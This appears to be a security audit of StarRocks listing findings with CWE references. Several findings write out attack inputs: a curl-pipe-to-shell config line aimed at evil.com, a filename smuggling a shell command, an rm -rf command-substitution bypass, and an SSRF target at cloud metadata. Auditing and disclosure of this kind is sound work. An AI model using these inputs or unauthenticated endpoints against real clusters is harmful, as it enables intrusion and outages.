headline: Unauthenticated Process Termination via /api/_stop_be
message: The BE HTTP handler for GET /api/_stop_be performs zero authentication or authorization checks. A single unauthenticated GET request to any BE node terminates the process unconditionally via set_process_quick_exit(). The BE HTTP server binds to the cluster network interface, not localhost. Iterating across all BE nodes brings down the entire cluster. OWASP A01:2021 – Broken Access Control; CWE-306: Missing Authentication for Critical Function.

headline: Unauthenticated Runtime Configuration Modification via /api/update_config
message: The BE HTTP handler for POST /api/update_config allows any network attacker to modify 70+ runtime configs including thread pool sizes, memory limits, cache settings, compaction concurrency, and feature flags without any authentication. This enables resource exhaustion DoS, cache poisoning, and behavior tampering via experimental flags. OWASP A01:2021 – Broken Access Control; CWE-306: Missing Authentication for Critical Function.

headline: Unauthenticated Log Exfiltration via /greplog
message: The BE HTTP handler for GET /greplog allows extraction of up to 1,000,000 log lines per request with attacker-chosen grep patterns, without any authentication. BE logs contain SQL query fragments, table names, internal IP addresses, file paths, error stack traces, and potentially sensitive data values appearing in error contexts. OWASP A01:2021 – Broken Access Control; CWE-532: Insertion of Sensitive Information into Log File.

headline: TLS Certificate Validation Disabled in Elasticsearch Connector
message: The Elasticsearch REST client unconditionally disables TLS certificate and hostname verification using TrustAllCerts and TrustAllHostnameVerifier. All HTTPS connections from StarRocks to Elasticsearch are vulnerable to man-in-the-middle attacks. An attacker controlling network routing can intercept Elasticsearch credentials, inject malicious query results, or steal data being indexed. There is no configuration option to enable proper validation. CWE-295: Improper Certificate Validation; OWASP A02:2021 – Cryptographic Failures.

headline: TLS Hostname Verification Disabled in FE HTTP Client
message: The FE's shared HTTP client singleton uses TrustSelfSignedStrategy (accepts any self-signed certificate) and NoopHostnameVerifier (accepts any hostname). This client is used for inter-node forwarding (RestBaseAction.java:346-348) and ProcProfileAction.java:236. Combined: MITM on any HTTPS request the FE makes. CWE-295; CWE-297: Improper Validation of Certificate with Host Mismatch.

headline: Path Traversal & SSRF in JWKS Loader
message: JwkMgr.getJwkSet() takes a user-controlled jwksUrl from CREATE USER or CREATE SECURITY INTEGRATION. For file paths, it concatenates STARROCKS_HOME_DIR/conf/ + jwksUrl without canonicalization, allowing ../../ traversal. For URLs, it calls URL.openStream() with no host allowlist or timeouts, enabling SSRF against internal services (e.g., AWS metadata at 169.254.169.254). Requires CREATE USER privilege. CWE-22: Path Traversal; CWE-918: Server-Side Request Forgery.

headline: Command Injection via system() in Profile File Handler
message: The profile file handler interpolates a user-controlled filename into a shell command passed to system(). The filename validator blocks directory traversal characters (.. / \) but does not block shell metacharacters (', ;, $, `, &, |). A filename like cpu-profile-'; id #-pprof.gz passes all validation checks and achieves command injection. Exploitation requires a file with shell metacharacters in its name to already exist in the proc_profile directory. CWE-78: OS Command Injection; OWASP A03:2021 – Injection.

headline: Multiple Unauthenticated FE Information-Disclosure Endpoints
message: Multiple FE REST endpoints bypass authentication by overriding execute() directly instead of executeWithoutPassword(). Affected endpoints include: GET /api/connection (IDOR – enumerate other users' queries), GET /api/query/progress (IDOR), GET /api/v2/feature (version fingerprinting), GET /api/show_runtime_info (JVM internals), GET /api/show_data (database/table sizes), GET /api/show_meta_info (HA topology), GET /api/idle_status (warehouse state). CWE-639: Authorization Bypass Through User-Controlled Key; CWE-200: Information Exposure.

headline: Unauthenticated BE Profiling & Memory-Layout Disclosure
message: BE pprof endpoints (/pprof/heap, /pprof/profile, /pprof/growth, /pprof/cmdline, /ioprofile, /metrics/memory) expose heap snapshots, CPU profiles, function names, call stacks, memory addresses (defeating ASLR), allocation patterns, and process command-line arguments — all without authentication. These are extremely valuable for attackers preparing exploits. CWE-200; CWE-497: Exposure of Sensitive System Information.

headline: zlib 1.2.11 with known memory corruption CVE
message: The project pins zlib 1.2.11 which has CVE-2018-25032 — a memory corruption bug in deflate triggered by certain inputs when using Z_FIXED strategy. StarRocks uses zlib for compressing data (Parquet, ORC, network). If user-supplied data is compressed with the affected codepath, this could lead to a crash or memory corruption. Upgrade to zlib >= 1.2.12 (preferably 1.3.1).

headline: Token Comparison Timing Attacks
message: Cluster token comparisons in BootstrapFinishAction.java:83 and GetSmallFileAction.java:74 use String.equals(), which short-circuits on the first mismatched byte, leaking timing information for brute-force attacks. Additionally, the invalid token attempt is logged (line 83), potentially exposing brute-force progress if logs are accessible (see log exfiltration finding). CWE-208: Observable Timing Discrepancy.

headline: exec_whitelist Regex Bypass via $(...) Substitution
message: The exec_whitelist function in script.cpp uses a regex that blocks <, >, |, ;, `, \ but not $, (, ), &, or newline. Therefore echo $(rm -rf /tmp/x) passes the filter and executes arbitrary commands via shell command substitution through popen(). Currently inert because the script binding is commented out at line 214, but a single uncomment would expose RCE. CWE-78: OS Command Injection.

headline: Multiple Unauthenticated BE State-Changing Operations
message: Multiple BE HTTP endpoints perform state-changing operations without authentication: POST /api/compact (trigger I/O storms), GET /api/snapshot (create disk snapshots), GET /api/reload_tablet (force tablet reload), GET /api/checksum (CPU-intensive checksum), PUT /api/query_cache/invalidate_all (wipe query cache), POST /api/restore_tablet (trigger tablet restore). An attacker can degrade cluster performance or destabilize operations. CWE-306: Missing Authentication for Critical Function.

headline: Shell eval() of Configuration File Contents
message: The common.sh script uses double eval to process configuration files: first eval echo $envline for expansion, then eval export. A config line like FOO=$(curl evil.com/sh|sh) would execute arbitrary commands at process startup. Used by start_be.sh, start_fe.sh, stop_*.sh to load be.conf/fe.conf. Requires write access to config files. CWE-78: OS Command Injection.

headline: SHA-1 for Password Authentication (MySQL Protocol Constraint)
message: MysqlPassword.java uses SHA-1 for password authentication (checkScramble, scramble, twoStageHash). SHA-1 is cryptographically broken. However, this implements MySQL's mysql_native_password protocol which mandates SHA-1. The double-SHA-1 scramble also lacks salting, making rainbow-table attacks viable. Cannot be removed without breaking older MySQL client compatibility; recommend implementing caching_sha2_password as preferred alternative. CWE-327: Use of a Broken or Risky Cryptographic Algorithm.

headline: Insecure Java Deserialization (Internal Data Path)
message: OdpsSplitScanner.deserialize() uses ObjectInputStream.readObject() without an ObjectInputFilter — the canonical Java deserialization RCE pattern. Data originates from FE's OdpsSplitsInfo.serialize() and travels over internal Thrift+JNI channels, never exposed to user input. Risk is realized only if an attacker can tamper with FE-to-BE Thrift traffic. CWE-502: Deserialization of Untrusted Data.

headline: Argument Injection in BNS Domain Resolver
message: DomainResolver constructs a command string by appending domainName (from CREATE USER host specification) to a binary path and passes it to Runtime.exec(String). While Runtime.exec(String) does not invoke a shell (preventing full RCE), it tokenizes on whitespace allowing argument injection (e.g., a domain like 'foo --some-flag'). CWE-88: Argument Injection.

headline: XML Factory Without Hardened Defaults (Output-Only Path)
message: SparkYarnConfigFiles.java creates a DocumentBuilderFactory without disabling external entity processing. The factory is used to generate XML config files for Spark (output-only), not to parse untrusted input, so XXE is not currently exploitable. Defense-in-depth concern: if refactored to parse external XML, the unhardened factory becomes a vulnerability. CWE-611: XML External Entity Reference.

headline: Optional Token Check on Download Endpoints
message: The BE download action at /api/_download_load, /api/_tablet/_download, /api/_load_error_log gates authentication behind config::enable_token_check, which is opt-in. Path validation via fs::canonicalize() + contain_path() is solid (no traversal possible), but if token check is disabled (or default-off), files are served without authentication. CWE-1188: Insecure Default Initialization.

headline: MD5 for non-security checksums
message: MD5 is used for file integrity checksums and query digests in CreateFunctionAnalyzer.java:178, JDBCResource.java:91, SmallFileMgr.java:335, JDBCConnector.java:84, ConnectProcessor.java:357. These are not used for authentication or signatures — acceptable use but noted for completeness.

headline: UUID.randomUUID() for session IDs — adequate
message: Java's UUID.randomUUID() uses SecureRandom internally on all major JVMs. Adequate for session IDs. No action needed.

headline: commons-collections 3.2.2 — patched but legacy
message: commons-collections 3.2.2 is the fixed release for CVE-2015-4852 — InvokerTransformer is disabled by default unless enableUnsafeSerialization=true. Still 3.x (legacy); recommend migrating to commons-collections4 when convenient.
